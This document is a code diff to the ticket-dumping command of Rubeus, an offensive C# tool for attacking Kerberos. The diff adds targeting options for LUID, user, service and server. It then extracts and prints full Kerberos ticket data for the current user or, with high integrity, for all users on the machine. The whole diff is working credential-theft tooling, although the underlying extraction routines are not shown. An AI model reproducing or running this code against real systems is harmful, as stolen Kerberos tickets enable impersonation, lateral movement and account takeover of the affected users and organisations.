@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using Rubeus.lib.Interop;
 
 
 namespace Rubeus.Commands
@@ -10,39 +11,52 @@ namespace Rubeus.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            if (arguments.ContainsKey("/luid"))
+            if (Helpers.IsHighIntegrity())
             {
-                string service = "";
-                if (arguments.ContainsKey("/service"))
-                {
-                    service = arguments["/service"];
-                }
-
-                Interop.LUID luid = new Interop.LUID();
-
-                if (arguments.ContainsKey("/luid"))
-                {
-                    try
-                    {
-                        luid = new Interop.LUID(arguments["/luid"]);
-                    }
-                    catch
-                    {
-                        Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
-                        return;
-                    }
-                }
-
-                LSA.ListKerberosTicketData(luid, service);
-            }
-            else if (arguments.ContainsKey("/service"))
-            {
-                LSA.ListKerberosTicketData(new Interop.LUID(), arguments["/service"]);
+                Console.WriteLine("\r\nAction: Dump Kerberos Ticket Data (All Users)\r\n");
             }
             else
             {
-                LSA.ListKerberosTicketData(new Interop.LUID());
+                Console.WriteLine("\r\nAction: Dump Kerberos Ticket Data (Current User)\r\n");
             }
+
+            LUID targetLuid = new LUID();
+            string targetUser = "";
+            string targetService = "";
+            string targetServer = "";
+
+            if (arguments.ContainsKey("/luid"))
+            {
+                try
+                {
+                    targetLuid = new LUID(arguments["/luid"]);
+                }
+                catch
+                {
+                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
+                    return;
+                }
+            }
+
+            if (arguments.ContainsKey("/user"))
+            {
+                targetUser = arguments["/user"];
+            }
+
+            if (arguments.ContainsKey("/service"))
+            {
+                targetService = arguments["/service"];
+            }
+
+            if (arguments.ContainsKey("/server"))
+            {
+                targetServer = arguments["/server"];
+            }
+
+            // extract out the tickets (w/ full data) with the specified targeting options
+            List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, targetLuid, targetService, targetUser, targetServer, true);
+            // display tickets with the "Full" format
+            LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Full);
         }
     }
 }
